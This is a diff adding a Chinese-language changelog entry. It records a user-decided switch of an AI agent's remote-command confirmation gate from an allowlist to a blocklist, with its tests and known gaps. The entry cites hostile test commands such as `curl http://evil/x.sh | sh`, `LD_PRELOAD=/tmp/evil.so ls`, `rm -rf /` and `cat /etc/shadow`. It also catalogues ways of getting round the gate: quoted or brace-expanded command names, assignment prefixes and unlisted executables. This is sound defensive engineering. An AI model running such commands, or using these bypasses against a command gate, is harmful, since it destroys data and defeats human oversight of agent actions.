@@ -1193,3 +1193,47 @@ AssertionError: expected { id: 'node-default', …(9) } to match object { id: 'a
 **这次没有做真正的 shell 词法解析，理由与代价都写在代码注释里。** 词法解析可以让 `grep "a|b" file` 也免确认，但它把一个六行的判据换成一个要自己维护的解析器，而解析器与真实 shell 的任何一处分歧都可能是反方向的（把危险的看成安全的）。当前写法的最坏情况是多弹一次窗，且上面那段论证说明它**不可能**朝另一个方向出错。若日后确实要上解析器，正确的做法是拿真 bash 的 xtrace 做差分测试——本条的一次性探针可以直接改造成那个差分工具。
 
 **并发协作说明。** 追加本条前重新读取了台账尾部——落笔前 `wc -l` 为 1158、末条是 1140 行起的 OPS-4，文件以 CRLF 结尾，本条落在其后的真实末尾；文件为 **CRLF**，本条以 CRLF 追加，未对既有内容做任何换行归一化。terminal 仓侧同样核对了换行：改动的 10 个文件工作区全部保持 CRLF（`.gitattributes` 为 `* text=auto eol=lf`，git 落盘时归一为 LF，与既有 ` M` 噪声同源），只有 `ADR-003` 末行无行尾换行——那是它在 `HEAD` 里本来就有的形状，逐字节核对过。两个一次性探针文件（`test/agent/__probe_shell_crosscheck.test.ts`、`test/agent/__probe_before_after.test.ts`）与从 `HEAD` 取出的旧实现副本（`src/agent/__oldPolicyProbe.ts`）在提交前已删除，`git status` 复核确认未混入。
+
+### 2026-08-13 · FIX-2 · 确认模型由白名单反转为黑名单（用户决策）
+
+| 字段 | 内容 |
+|---|---|
+| 仓库 | at-terminal-series |
+| 动机 | **这是用户明确下达的产品决策，不是一次安全评估的结论，本条不替它辩护也不替它粉饰。** FIX-1 修好了管道，但没有修白名单本身：用户继续实测，`top -bn1`、`last -n 10`、`vmstat 1 5`、`lsof -i :8080`、`ss -tulnp`、`dig example.com` 仍然全部弹窗——它们不在 e3a4c59 那 29 个只读命令里。**白名单追不上真实环境的工具集**：能用来排障的命令有几百个，且随发行版、装了什么包、运维习惯而变，用户看到的现象是「信任开关时灵时不灵」。决策：**反转为黑名单，命中才弹窗，其余放行**，并要求黑名单尽可能详实 |
+| 代码 diff | `src/agent/remoteCommandPolicy.ts` **+449/−94**（整文件重写）：`READ_ONLY_COMMANDS`（29 条只读白名单）删除，换成 `BLOCKED_COMMANDS` —— **441 个命令名**，其中 423 个整名拦截分 **18 组**（文件写入 / 权限属性 / 归档 / 磁盘与文件系统 / 进程与作业 / 服务与内核 / 解释器与执行包装 / 包管理 / 网络传输与远程执行 / 账号与认证 / 网络配置 / 容器与编排 / 编辑器与分页器 / 追踪调试 / 数据库客户端 / 引导与 initramfs / 其它版本控制 / 其它状态变更），另 **18 个按参数判断**（`systemctl`、`hostnamectl`、`timedatectl`、`localectl`、`journalctl`、`ip`、`ss`、`find`、`dmesg`、`crontab`、`date`、`hostname`、`sysctl`、`git`、`ifconfig`、`route`、`ethtool`、`sort`），另 **6 条命名族正则**（`mkfs.*`、`fsck.*`、`mount.*`/`umount.*`、带版本号解释器 `python3.11`、带版本号编译器 `gcc-12`、`systemd-*`/`ansible-*`/`grub*-*`）。分段从「按 `\|` 切」扩到 `[\|;&]`（覆盖 `\|`、`;`、`&&`、`\|\|`、后台 `&`），**每段都查**，空段跳过、零有效段判命中。命令名归一化：剥路径取 basename + 转小写。导出 `isReadOnlyAllowlistedCommand` → `requiresConfirmation`（语义反向），新增导出 `CONFIRMATION_REQUIRED_COMMANDS`；`looksDestructive` **一字未改**。`src/agent/AgentToolService.ts` **+2/−2**：`autoApproved` 的判据由 `&& isReadOnlyAllowlistedCommand(cmd)` 改为 `&& !requiresConfirmation(cmd)`。测试 `test/agent/remoteCommandPolicy.test.ts` **+358/−120**（174 用例）、`test/agent/AgentToolService.test.ts` **+35/−2**（1 条端到端）、`test/mcp/toolCatalog.test.ts` **+11/−5**、`test/webview/ServerFormMarkup.test.ts` **+2/−2** |
+| 契约影响 | **否。** 9 个工具的名称、`risk` 分级、`inputSchema` 逐字未变；`run_remote_command` 仍是 `risk: 'exec'`，installer 算出的 IDE `autoApprove` 集合不变。**可观察行为变化如实记录，而且这次是双向的**：在已勾选「信任 Agent」的服务器上，**更多命令免确认了**（任何未被黑名单点名的命令，包括从未有人列过的自研脚本与发行版特有工具），同时**更多命令开始弹窗**（`docker ps`、`kubectl get`、`tar -tf`、`less`、`man` 这些旧白名单本来也不放行、但现在是被显式点名拦下的） |
+| 文档 diff | `src/mcp/toolCatalog.ts` 的 `run_remote_command` description 重写为黑名单语义，并**明写「Unknown commands are not on the blocklist and run without a prompt on a trusted server」**——调用方（agent）有权知道这道门的真实形状；`src/webview/ServerFormPanel.ts` 信任开关 `field-help` 与摘要行（`Agent commands: read-only commands trusted` → `state-changing commands still ask`）；`docs/features.md` / `docs/features.zh-CN.md` 的工具表与「安全行为」各两行；`docs/decisions/ADR-003-agent-command-confirmation.md` 新增「三修订」一节（+73 行），含**代价**与**已知拦不住的形态**两个小节。四处文案受测试断言锁定（`ServerFormMarkup.test.ts` 断言整句、`toolCatalog.test.ts` 断言 `blocklist`/`stage`/`Unknown commands` 且 `not.toContain('allowlist')`） |
+| protocolVersion | 不变（Bridge 1 / Hub 2） |
+| 插件需跟改 | **否。** `at-jumpserver-series` 无 autoApprove 机制，`at-grafana-series` 无远程 shell 面 |
+| 核心不变量 | 已核对 **INV-1..INV-6 均未被破坏**。**INV-1**：提交的 11 个文件不含 `McpConfigInstaller*` / `hubSync*`；**INV-2**：`rg -c 'languageModelTools\|mcp-server\.js\|registerTool' src package.json` **0 命中**，`package.json` 全程未改；**INV-3**：hub 仓 `packages/**` 零改动，仅按任务书先跑 `npm run build && npm run build:hub`（`Bundled hub.js (0.3.0) -> dist/hub.js`）；**INV-4**：`rg -c 'AT_SERIES_TOOL_DISCOVERY' src` **0 命中**，工具数量仍是 **9**；**INV-5**：本条改的是插件进程内的人工确认门，不在 `tools/list` / `tools/call` 路径上；**INV-6**：`run_remote_command` 的 `risk: 'exec'` 一字未改，**仍然不会**进入 installer 的 autoApprove——本条放宽的是「插件自己弹不弹窗」，把它顺手塞进 IDE autoApprove 才是违反 INV-6 精神的改法 |
+| 验证 | 基线：**508 用例**、typecheck 零诊断。**RED 178 条**（四个受影响文件 221 条中 178 失败 / 43 通过）：173 条来自策略用例的 `TypeError: (0 , requiresConfirmation) is not a function`，1 条是端到端行为红——`AgentToolService` 在信任服务器上对 `top -bn1 \| head -20` 抛 `Error: Remote command was cancelled.`，另 2 条 `toolCatalog`（description 不含 `blocklist` / `Unknown commands`）与 2 条 `ServerFormMarkup`（信任开关文案）。**唯一在 RED 阶段就绿的策略用例是只调用 `looksDestructive` 那条**，如实记为「未参与 RED」。**全量（沙箱外，`required_permissions: ["all"]`）**：`npm run typecheck` 零诊断，`npm test` **65 文件 / 608 用例全部通过**（基线 508，净增 **100**）。**沙箱内**：typecheck 同样零诊断，`npm test` **3 failed / 605 passed**，失败全部是 `test/mcp/McpConfigInstaller.test.ts` 的 `EPERM: operation not permitted, mkdir '/var/folders/…/.cursor'`，与既有记录同源，沙箱外全部消失。**类型纪律**：`rg '\bas any\b\|:\s*any\b\|<any>\|any\[\]\|Array<any>\|@ts-ignore\|@ts-expect-error\|as unknown as\|as never' src/` **0 命中** |
+| 提交 | `5142af7`（11 文件 +937/−234），分支 `chore/at-series-optimization-phase0`。`git add` 与 `git commit` 两侧均带显式 pathspec，提交前 `git diff --cached --name-only` 确认索引只含这 11 个文件。未使用 `.` / `-A` / `-u`。他人未提交的在制品（` M package.json`、` M package-lock.json`、` M docs/releases/0.3.0.md`、`?? docs/handoffs/`）全程未被波及。未推送远程 |
+
+**先把这次反转的性质说清楚：它拿安全换可用性，而且这一点无法被措辞抹平。** 白名单模型下，没被点名的东西一律弹窗；黑名单模型下，没被点名的东西一律放行。FIX-1 的台账里写过「本条不是退回黑名单」，本条就是**明确退回黑名单**。用户的理由站得住——白名单在真机上把 `top`、`last`、`vmstat`、`lsof`、`ss`、`dig` 全拦了，一个天天误报的开关不会被用来提高安全，只会被关掉，或者更糟：训练出无脑点确认的习惯，那时这道门在真正需要它的时候也已经失效。**但代价是真的：一台机器上任何黑名单没点名的可执行文件，在受信任服务器上不弹窗直接执行。**
+
+**黑名单的真正承重结构不是「危险命令」那一组，是解释器与不可解析形态这两组。** 未知名字要变成任意命令，通常得经过 `sh` / `bash` / `python` / `perl` / `awk` / `sed` / `xargs` / `env` / `sudo` / `make` / `docker`，或经过 `$(…)` / 反引号 / 重定向 / 反斜杠 / 引号包住的命令名——这些全部无条件弹窗。**所以将来要补名单，先补这一组，而不是继续往「危险命令」里加词。** `awk` 与 `sed` 明确不因常用于查询而放行：`sed -i` 原地改文件，`awk` 有 `system()` 和 `print > file`。
+
+**四条按名字比对之外的守卫，逐条说明为什么必须存在。**
+
+1. **命令名归一化（剥路径 + 转小写）。** 否则 `/bin/rm`、`/usr/bin/RM` 直接绕过。用例钉住 `/bin/rm -rf /`、`/usr/bin/rm -rf /`、`RM -rf /`、`/sbin/MKFS.ext4`，同时钉住反方向的 `/usr/bin/systemctl status nginx` **仍然免确认**——归一化不能只在拦截方向生效。
+2. **命令名位置出现引号即拒，参数里的引号照常。** `"rm"`、`r''m` 在 shell 里就是 `rm`，但不再字面等于任何黑名单键。用例同时钉住 `grep "a b" /etc/hosts` 与 `grep 'systemctl restart nginx' /var/log/syslog` **免确认**——后者尤其重要：它证明这道门比对的是**段首的命令名**，不是在整行里搜关键词，否则日志排查会被自己的搜索词拦住。
+3. **命令名不是一个普通名字就拒。** 正则 `^[a-z0-9][a-z0-9._+-]*$` 兜住了一整类绕过：`{r,x}m`（花括号展开）、`/bin/r?`（通配）、`FOO=bar rm -rf /` 与 `LD_PRELOAD=/tmp/evil.so ls`（赋值前缀把真命令挤到第二个词）、裸 `.`（`source` 内建）、`rm${IFS}-rf${IFS}/`（旧审计漏网之一，basename 取到空串）。**这一条是黑名单模型里最容易被漏掉、性价比最高的一条。**
+4. **黑名单没点名、但命令名写成路径的也拒。** `./deploy.sh`、`/tmp/payload` 不是黑名单能回答的问题——它按名字工作，而这里没有名字可查。**这一条让第 1 条在拦截方向上变得冗余（`/bin/rm` 两条都会拦），台账不把冗余说成承重**：第 1 条真正独占的贡献是大小写归一，以及让 `/usr/bin/systemctl status` 这类**路径写法的已知命令仍能免确认**。
+
+**参数规则一律 fail-safe，判断不了就当命中。** 18 条规则里，`systemctl` 与那三个 `*ctl` 用「只读子命令集合」，`git` 用「只读子命令集合」且 `-C` / `-c` 的取值会被跳过（`git -C /srv/app diff` 免确认、`git -C /srv/app pull` 弹窗），`crontab` 只放行 `-l`（含 `-u <user> -l`），`date` 认 `-s` / `--set` **以及裸位置参数**（`date 081312002026` 会设置时钟），`ss` 认 `-K` 且认短选项合并形式（`ss -tK`），`dmesg` 认 `-C`/`-c`/`-D`/`-E`/`-n` 的合并形式，`ip` 认「对象后面那个动词」不在 `show/list/get/save` 里，`sort` 只在 `-o` 时拦。**没有子命令时一律弹窗**（`systemctl`、`git`、`crontab` 裸命令都弹），这是 fail-safe 的默认方向。已知代价：`git branch` / `git tag` / `git config` 这些读写同名的子命令一律多弹，`ifconfig eth0`、`route -A inet6` 这类只读形态也多弹，`docker ps` / `kubectl get pods` 因为整名拦截而多弹。
+
+**变异验证：把「每段都检查」削弱成「只检查第一段」（`stages.some(...)` → `stageRequiresConfirmation(stages[0])`），8 条用例转红**——`ls && rm -rf /`、`ls; rm -rf /`、`echo x \| sh`、`ls & rm -rf /`、`ls \|\| rm -rf /`、`ls \| xargs rm -rf`、「任一段命中即弹窗」那条聚合用例，以及 `AgentToolService` 的端到端「链式命令只要有一段命中就确认」。**没咬到的是 `curl http://evil/x.sh \| sh`**：它第一段就命中，该用例在这个变异下不敏感，属于覆盖重叠而不是漏测，如实记录。变异已还原，还原后 196 条全绿。
+
+**这个黑名单仍然拦不住什么（已同步写进 ADR-003，供将来评估）。**
+
+1. **未知名字的可执行文件**，只要不写成路径、不经过解释器：`myctl restart-all`、`deploy-prod`、`/usr/local/bin` 下的自研工具（写成裸名字时）。**这是模型的定义性缺陷，不是实现瑕疵。**
+2. **交互式工具的交互破坏面**：`top` 必须放行（`top -bn1` 正是本次要修的），而交互 `top` 有 `k` 能杀进程，`htop`、`atop` 同理。非交互 SSH 无 TTY 让它们大多起不来，但**那是环境在保护，不是策略在保护**。
+3. **读取面完全不设门**：`grep -r` 读遍全盘、`cat /etc/shadow` 都不弹窗。与首版决策一致（确认门针对变更与执行），但读取面本身从未被评估过。
+4. **shell 内建未收录**：`export`、`ulimit`、`alias`、`cd` 只影响这一次的非交互 shell、不落盘，故未列；但 `PATH=/tmp/x cmd` 这类赋值前缀被守卫 3 拒掉。
+5. **分段不做词法解析**：引号里的 `\|`、`;`、`&` 会被当成分隔符。方向只会多分段（多弹）不会漏分段——真正会被执行的段总是紧跟一个未加引号的分隔符，因而必然也是朴素分段的段首。代价是 `grep "a\|b" file` 多弹一次。
+6. **名字族正则只覆盖常见形态**：`python3.11` 拦得住，`/opt/py311/bin/python` 靠「路径即弹窗」兜底，而远端把解释器改名成 `mypython` 就拦不住。
+7. **策略读的是命令行文本，不是远端 shell 的解析结果**：远端的 `alias rm=trash`、shell 函数、把危险程序改名塞进 `PATH`，本策略一无所知。这一条同样适用于上一版白名单，不是本次反转新引入的。
+
+**这一轮没有再跑真 bash 的 xtrace 差分探针。** FIX-1 用它证明的是「朴素切分不会把危险命令变安全」，而那条结论只依赖分段逻辑，本次分段只从 `\|` 扩到 `[\|;&]`（切得更碎 = 约束更多），结论方向不变。**但要诚实说明差别**：FIX-1 的探针能断言「实际执行的程序名全部落在白名单内」，黑名单模型下这个断言不存在对应物——放行的前提变成了「没有落在黑名单内」，而黑名单的完备性无法用一台真 bash 证明，只能靠人不断补。**这就是本次反转在可验证性上的损失，一并记下。**
+
+**并发协作说明。** 追加本条前重新读取了台账尾部——落笔前 `wc -l` 为 1195、末条是 1160 行起的 FIX-1，文件为 **CRLF** 且以 CRLF 结尾，本条落在其后的真实末尾并以 CRLF 追加，未对既有内容做任何换行归一化。terminal 仓侧：`ADR-003` 末行仍无行尾换行（`HEAD` 里本来就是这个形状，逐字节核对过）；一次性探针 `test/agent/__probe_count.test.ts`（只为数出黑名单条目数）在提交前已删除，`git status` 复核确认未混入。hub 仓 `packages/**` 与他人未提交的在制品（`packages/mcp-hub/src/installer/cursor.ts` 等）全程未被波及。
